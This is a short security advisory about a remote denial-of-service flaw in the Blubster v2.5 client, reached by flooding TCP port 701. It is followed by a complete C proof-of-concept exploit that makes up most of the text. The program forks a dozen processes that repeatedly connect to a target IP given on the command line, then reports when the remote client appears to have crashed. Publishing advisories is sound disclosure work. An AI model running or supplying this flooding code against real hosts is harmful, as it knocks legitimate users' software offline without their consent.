source: http://www.securityfocus.com/bid/8482/info

t has been reported that Blubster is prone to a remote denial of service vulnerability due to a port flooding attack on TCP port 701. The problem is reported to present itself when a remote attacker floods port 701 with voice chat session requests. This issue may cause the software to crash resulting in a denial of service to legitimate users.

This attack may not be logged, therefore allowing an attack to exploit this issue persistently. 

/******************************************************************
* Blubster client v2.5 Remote Denial of Service *
* Proof of Concept by Luca Ercoli luca.ercoli[at]inwind.it *
******************************************************************/
 
#include <stdio.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
 

int ck,port=701,sd,cx=0,contatore=0,prec;
 
struct sockaddr_in blubster_client;
 
 
 
void ending(char *client){
 
int i;
 

blubster_client.sin_family = AF_INET;
blubster_client.sin_port = htons((u_short)port);
blubster_client.sin_addr.s_addr = (long)inet_addr(client);
 

for(i = 0; i < 100; i++){
 
sd = socket(AF_INET, SOCK_STREAM, 0);
ck = connect(sd, (struct sockaddr *) &blubster_client, sizeof(blubster_client)); 
 

if(ck != 0) { 
 
prec = 0;
 
if (prec == 0) contatore++;
if (prec == 1) contatore = 0;
 
if (contatore > 13) {
printf("! Remote client seems to be crashed.\n");
exit(0);
}
 
}
 
if(ck == 0) prec = 1;
 
  close(sd);
}
 
}
 
 
 

void kill_blubster(char *stringa){
 
short i;
 
  blubster_client.sin_family = AF_INET;
  blubster_client.sin_port = htons((u_short)port);
  blubster_client.sin_addr.s_addr = (long)inet_addr(stringa);
   
 
for(i = 0; i < 50; i++){
 
  
sd = socket(AF_INET, SOCK_STREAM, 0);
ck = connect(sd, (struct sockaddr *) &blubster_client, sizeof(blubster_client)); 
 

if(ck != 0) exit(0);
 
close(sd);
 
}
 
}
 
 
 

int main(int argc, char **argv)
{
 
short i;
 
 prec = 0;
 
  if(argc < 2)
  { 
    printf("\nUsage: %s <client-ip>\n", argv[0]);
    exit(0);
  }
  
 
prec=0;
 
printf ("\n\n+ DoS Started...\n");
printf("+ Flooding remote client...\n");
 

for (i=0; i<12; i++) if(!fork()) kill_blubster(argv[1]);
 
printf ("+ Ending...\n");
 
ending(argv[1]);
  
}